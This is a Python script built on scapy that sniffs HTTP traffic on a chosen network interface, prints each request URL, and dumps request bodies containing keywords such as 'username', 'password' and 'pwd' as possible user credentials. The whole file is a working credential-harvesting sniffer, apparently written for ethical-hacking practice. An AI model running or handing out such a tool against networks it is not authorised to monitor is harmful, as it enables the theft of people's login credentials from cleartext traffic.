#!/usr/bin/env python3

import scapy.all as scapy
import scapy_http.http as http
import argparse

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="interface",
                        help="IP address to be scanned")
    options = parser.parse_args()

    if not options.interface:
        parser.error("Please select interface")

    return options


def get_url(packet):
    return str(packet[http.HTTPRequest].Host) + str(packet[http.HTTPRequest].Path)


def get_user_credentials(packet):
    if packet.haslayer(scapy.Raw):
        # print(packet.show())
        load = packet[scapy.Raw].load
        keywords = ["username", "user_name", "uname", "email",
                    "pass", "mobile", "password", "pwd", "usr", "user", "login"]
        # Does request contain these keywords?            
        for keyword in keywords:
            # checkkng keyword in load
            if keyword in str(load):
                return load


def process_sniffed_packet(packet):
    # print(packet.show())
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP request URL " + url)

        user_credentials = get_user_credentials(packet)
        if user_credentials:
            print("\n\n[+] Possible user credentials are -> " +
                  str(user_credentials) + "\n\n")


def sniffer(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


if __name__ == "__main__":
    args = get_arguments()
    sniffer(args.interface)
